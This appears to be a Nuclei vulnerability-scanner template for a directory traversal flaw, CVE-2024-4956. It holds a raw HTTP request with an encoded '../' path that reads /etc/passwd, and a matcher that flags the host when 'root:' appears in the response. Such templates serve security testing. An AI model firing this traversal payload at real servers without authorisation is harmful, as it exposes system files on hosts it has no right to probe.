id: directory-traversal-cve-2024-4956

info:
  name: Directory Traversal to /etc/passwd (CVE-2024-4956)
  author: xungzzz
  severity: high
  description: This template checks for a directory traversal vulnerability (CVE-2024-4956) by attempting to access the /etc/passwd file.
  tags: directory-traversal, lfi, sensitive-files, CVE-2024-4956

requests:
  - raw:
      - |
        GET /%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate, br
        Accept: */*
        Accept-Language: en-US;q=0.9,en;q=0.8
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
        Connection: close
        Cache-Control: max-age=0

    matchers:
      - type: word
        words:
          - "root:"
        part: body
